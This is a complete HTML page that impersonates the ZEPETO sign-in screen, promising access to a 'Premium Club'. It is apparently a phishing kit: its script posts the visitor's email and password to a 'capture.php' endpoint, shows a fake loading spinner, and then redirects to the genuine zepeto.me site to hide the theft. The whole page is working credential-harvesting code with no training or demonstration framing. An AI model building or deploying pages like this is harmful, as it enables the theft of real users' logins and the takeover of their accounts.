<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZEPETO - Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: #fff;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px 32px;
            width: 100%;
            max-width: 400px;
            margin: 20px;
        }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 48px; height: 48px; }
        .logo h1 { font-size: 24px; font-weight: 700; color: #1a1a2e; margin-top: 8px; }
        .logo p { color: #888; font-size: 14px; margin-top: 4px; }
        .social-buttons {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 28px;
        }
        .social-btn {
            width: 56px; height: 56px; border-radius: 50%;
            border: 1px solid #e8e8e8; background: #fff;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; font-size: 22px; transition: all 0.2s;
        }
        .social-btn:hover { border-color: #667eea; box-shadow: 0 2px 12px rgba(102,126,234,0.2); }
        .divider {
            display: flex; align-items: center; margin: 20px 0; color: #bbb; font-size: 12px;
        }
        .divider::before, .divider::after {
            content: ''; flex: 1; height: 1px; background: #e8e8e8;
        }
        .divider span { margin: 0 16px; }
        .form-group { margin-bottom: 16px; }
        .form-group label {
            display: block; font-size: 13px; font-weight: 600;
            color: #333; margin-bottom: 6px;
        }
        .form-group input {
            width: 100%; padding: 14px 16px;
            border: 1.5px solid #e0e0e0; border-radius: 12px;
            font-size: 15px; transition: border 0.2s; outline: none;
        }
        .form-group input:focus { border-color: #667eea; }
        .submit-btn {
            width: 100%; padding: 15px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff; border: none; border-radius: 12px;
            font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px;
        }
        .submit-btn:hover { opacity: 0.9; }
        .links { text-align: center; margin-top: 20px; }
        .links a { color: #667eea; text-decoration: none; font-size: 13px; }
        .links a:hover { text-decoration: underline; }
        .loading { text-align: center; padding: 20px; display: none; }
        .spinner {
            border: 3px solid #f3f3f3; border-top: 3px solid #667eea;
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 0.8s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">
        <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M24 4L44 40H4L24 4Z" fill="#667eea"/>
            <path d="M24 12L36 36H12L24 12Z" fill="white"/>
        </svg>
        <h1>ZEPETO</h1>
        <p>Sign in to continue to Premium Club</p>
    </div>
    <div class="divider"><span>sign in with email</span></div>
    <form id="loginForm" method="POST" action="/capture">
        <div class="form-group">
            <label for="email">Email</label>
            <input type="email" id="email" name="email" placeholder="you@example.com" required>
        </div>
        <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
        </div>
        <button type="submit" class="submit-btn">Sign In</button>
    </form>
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p style="margin-top:12px;color:#888;font-size:13px;">Signing in...</p>
    </div>
    <div class="links"><a href="#" onclick="return false;">Forgot password?</a></div>
</div>
<script>
    const form = document.getElementById('loginForm');
    const loading = document.getElementById('loading');
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();
        if (!email || !password) return alert('Please fill in both fields.');
        form.style.display = 'none';
        loading.style.display = 'block';
        fetch('capture.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ email, password })
        }).then(() => {
            setTimeout(() => { window.location.href = 'https://zepeto.me'; }, 2000);
        }).catch(() => {
            window.location.href = 'https://zepeto.me';
        });
    });
</script>
</body>
</html>
